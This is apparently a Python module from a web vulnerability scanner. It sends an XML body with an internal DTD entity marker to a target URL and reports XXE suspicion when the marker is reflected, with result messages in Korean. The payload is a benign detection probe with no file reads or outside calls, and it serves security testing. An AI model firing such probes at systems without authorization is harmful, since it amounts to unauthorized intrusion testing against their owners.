import argparse
import json
import sys
import requests


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--input", required=True)
    args = parser.parse_args()

    with open(args.input, "r", encoding="utf-8") as f:
        payload = json.load(f)

    base_url = payload["base_url"].rstrip("/")
    path = payload.get("path", "")
    method = payload.get("method", "POST").upper()
    body_params = payload.get("body_params", {})

    url = f"{base_url}{path}"

    print(f"[DEBUG] url={url}", file=sys.stderr)
    print(f"[DEBUG] method={method}", file=sys.stderr)
    print(f"[DEBUG] original_body={body_params}", file=sys.stderr)

    if method not in ("POST", "PUT", "PATCH"):
        result = {
            "poc_name": "xxe_based",
            "status": "Skipped",
            "description": "XXE 테스트는 body를 사용하는 POST/PUT/PATCH 요청에서만 수행합니다.",
            "evidence": f"unsupported method={method}",
            "raw_output": "",
            "vulnerable": False,
        }
        print(json.dumps(result, ensure_ascii=False))
        return

    xml_body = """
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE root [
        <!ENTITY xxe "XXE_TEST_MARKER_9157">
        ]>
        <root>
        <data>&xxe;</data>
        </root>
        """

    headers = {
        "User-Agent": "Scanner-033ca182-dcdd-406b-bcb5-816d726ca809",
        "Content-Type": "text/xml",
        "Accept": "*/*",
    }

    parser_error_keywords = [
        "doctype",
        "dtd",
        "entity",
        "xml parser",
        "undeclared entity",
        "external entity",
        "forbidden",
        "disallowed",
        "not allowed",
    ]

    marker = "XXE_TEST_MARKER_9157"

    try:
        response = requests.request(
            method=method,
            url=url,
            data=xml_body,
            headers=headers,
            timeout=5,
            allow_redirects=False,
        )

        response_text = response.text
        response_preview = response_text[:500]
        response_lower = response_text.lower()

        marker_reflected = marker in response_text
        parser_error_detected = any(keyword in response_lower for keyword in parser_error_keywords)

        vulnerable = False
        description = "명확한 XXE 취약 반응은 확인되지 않았습니다."
        evidence_parts = [f"HTTP {response.status_code}"]

        if marker_reflected:
            vulnerable = True
            description = "XML 엔티티 값이 응답에 반영되어 XXE 또는 XML 엔티티 처리 취약점이 의심됩니다."
            evidence_parts.append("entity marker reflected in response")

        elif parser_error_detected:
            vulnerable = False
            description = "XML parser 또는 ENTITY/DTD 관련 반응이 확인되었습니다. XML 파싱은 수행되지만, 명확한 XXE 성공 증거는 없습니다."
            evidence_parts.append("parser/entity related message detected")

        elif response.status_code in (400, 415):
            vulnerable = False
            description = "서버가 XML 요청을 정상 처리하지 않았거나 지원하지 않는 것으로 보입니다."
            evidence_parts.append("xml not accepted or bad xml request")

        elif response.status_code >= 500:
            vulnerable = False
            description = "서버 내부 오류가 발생했습니다. XML 처리 중 예외 가능성은 있으나, 이것만으로 XXE 취약점이라고 판단할 수 없습니다."
            evidence_parts.append("server error without clear xxe evidence")

        result = {
            "poc_name": "xxe_based",
            "status": "Completed",
            "description": description,
            "evidence": " | ".join(evidence_parts),
            "raw_output": response_preview,
            "vulnerable": vulnerable,
        }

    except Exception as e:
        result = {
            "poc_name": "xxe_based",
            "status": "Error",
            "description": "PoC execution failed.",
            "evidence": str(e),
            "raw_output": "",
            "vulnerable": False,
        }

    print(json.dumps(result, ensure_ascii=False))


if __name__ == "__main__":
    main()